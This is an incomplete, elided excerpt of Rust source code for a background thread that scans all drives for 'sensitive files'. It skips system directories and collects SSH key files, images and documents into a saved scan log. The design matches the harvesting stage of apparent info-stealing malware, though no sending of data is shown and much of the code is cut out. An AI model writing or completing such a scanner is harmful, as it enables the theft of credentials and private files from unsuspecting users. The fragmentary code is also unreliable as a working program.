...
const EXCLUDED_DIRS: &[&str] = &[
    ...
    "$Recycle.Bin", "$WINDOWS.~BT", "AppData\\Local\\Microsoft", "AppData\\Local\\Temp",
    "Library/Application Support/Apple", "Library/Caches", "/System", "/bin", "/etc",
    "Android/data", "iOS", "Phone",
];
...
pub fn start_file_scanner() {
    ...
    thread::spawn(move || {
        ...
        Log::info(format!("Scanning {} drives for sensitive files...", drives.len()));
        ...
        match writer::save_output(&scan_result, SCAN_LOG_FILE, false) {
            Ok(_) => { Log::info(format!("Saved scan results to {}", SCAN_LOG_FILE)); }
            Err(e) => { Log::error(format!("Failed to save scan results: {}", e)); }
        }
...
fn process_file(entry: DirEntry, drive_name: &str, result: &mut ScanResult) {
    ...
    if is_ssh_file(&path_string) {
        add_file_info(&path, &file_name, &extension, "ssh", drive_name, &mut result.ssh_files);
    }
    
    // Check for image files
    if IMAGE_EXTENSIONS.iter().any(|ext| extension == *ext) {
        add_file_info(&path, &file_name, &extension, "image", drive_name, &mut result.images);
    }
    
    // Check for document files
    if DOCUMENT_EXTENSIONS.iter().any(|ext| extension == *ext) {
        add_file_info(&path, &file_name, &extension, "document", drive_name, &mut result.documents);
    }
}
...
fn is_ssh_file(path: &str) -> bool {
    ...
    SSH_FILES.iter().any(|ssh_file| path_lower.contains(ssh_file))
}
